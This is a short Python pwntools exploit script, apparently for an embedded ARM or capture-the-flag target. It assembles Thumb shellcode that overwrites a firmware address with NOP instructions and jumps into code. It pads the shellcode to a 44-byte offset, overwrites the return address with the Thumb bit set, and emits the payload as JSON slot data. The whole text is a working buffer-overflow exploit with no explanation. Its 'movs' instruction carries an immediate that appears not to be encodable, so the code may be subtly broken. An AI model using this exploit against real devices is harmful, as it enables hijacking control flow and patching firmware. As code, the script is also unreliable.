import json
from pwn import *

payload_addr = 0x2001FF14
offset = 44

assembly = """
    movs r1, #0xBF00BF00  
    ldr r0, =0x8007B10
    str r1, [r0]
    ldr r0, =0x8007901
    bx r0
"""

shellcode = asm(assembly, arch="thumb")
print(disasm(shellcode, arch='thumb'))

payload = shellcode
payload += b"\x41" * (offset - len(payload))

payload += p32(payload_addr | 1) # Thumb mode, so LSB must be set

print(len(payload))

print(json.dumps({"slot": 1, "data": list(payload)}).replace(" ", ""))